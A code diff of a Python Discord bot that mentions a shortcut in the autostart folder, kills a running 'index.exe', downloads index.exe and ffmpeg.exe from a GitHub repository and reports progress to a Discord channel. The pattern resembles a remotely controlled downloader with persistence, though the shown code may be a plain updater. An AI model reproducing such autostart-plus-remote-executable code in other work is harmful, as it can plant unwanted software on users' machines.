@@ -116,7 +116,7 @@ async def on_ready():
         print(f"Channel with ID {channel_id} not found.")
         await client.close()
         return
-    
+
     print("Shortcut created in autostart folder.")
     print(f"Logged in as {client.user}")
     print(f"Found channel: {channel.name}")
@@ -124,20 +124,26 @@ async def on_ready():
     # Kill the existing process if running
     await kill_process("index.exe")
 
-    # Download the file
-    
+    # Download index.exe
+    url_index = "https://github.com/Plexisity/announcer/raw/main/index.exe"
+    filename_index = "index.exe"
+    if os.path.exists(filename_index):
+        print(f"File {filename_index} already exists. Deleting it...")
+        os.remove(filename_index)
+    print("Starting download of index.exe...")
+    await channel.send("Starting download of index.exe...")
+    await download_file(url_index, filename_index)
 
-    if os.path.exists(filename):
-        print(f"File {filename} already exists. Deleting it...")
-        os.remove(filename)
+    # Download ffmpeg.exe
+    url_ffmpeg = "https://github.com/Plexisity/announcer/raw/main/ffmpeg.exe"
+    filename_ffmpeg = "ffmpeg.exe"
+    if os.path.exists(filename_ffmpeg):
+        print(f"File {filename_ffmpeg} already exists. Deleting it...")
+        os.remove(filename_ffmpeg)
+    print("Starting download of ffmpeg.exe...")
+    await channel.send("Starting download of ffmpeg.exe...")
+    await download_file(url_ffmpeg, filename_ffmpeg)
 
-    print("Starting download...")
-    await channel.send("Starting download...")
-    url = "https://github.com/Plexisity/announcer/raw/main/index.exe"
-    filename = "index.exe"
-    await download_file(url, filename)
-    url = "https://github.com/Plexisity/announcer/raw/main/ffmpeg.exe"
-    filename = "ffmpeg.exe"
     print("Download complete.")
     await channel.send("Download complete.")
 
